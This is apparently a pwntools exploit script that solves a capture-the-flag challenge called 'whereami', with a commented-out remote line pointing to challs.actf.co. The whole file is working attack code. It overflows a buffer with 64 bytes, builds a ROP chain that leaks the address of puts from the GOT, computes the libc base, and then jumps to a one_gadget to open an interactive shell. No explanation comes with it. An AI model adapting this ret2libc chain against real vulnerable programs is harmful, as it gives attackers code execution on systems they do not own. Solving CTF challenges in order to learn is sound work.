from pwn import *

elf = ELF("./whereami")
libc = ELF("./libc.so.6")
p = elf.process()
#p = remote("challs.actf.co", 31222)
raw_input("DEBUG")
ret = 0x000000000040101a
pop_rdi = 0x0000000000401303
pop_rbp = 0x00000000004011dd

payload = b"A"*64
payload += p64(0x404060)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(pop_rdi)
payload += p64(0x404068)
payload += p64(0x000000000040127c)

p.sendline(payload)
p.recvuntil("I hope you find yourself too.\n")
leaked_puts = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00"))
libc.address = leaked_puts - libc.sym['puts']
one_gadget = libc.address + 0xe3b2e
log.info("leaked_puts: "+hex(leaked_puts))
log.info("libc base "+hex(libc.address))
log.info("one_gadget " +hex(one_gadget))

payload2 = p64(0x00000000004012fc)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(one_gadget)
p.sendline(payload2)

p.interactive()
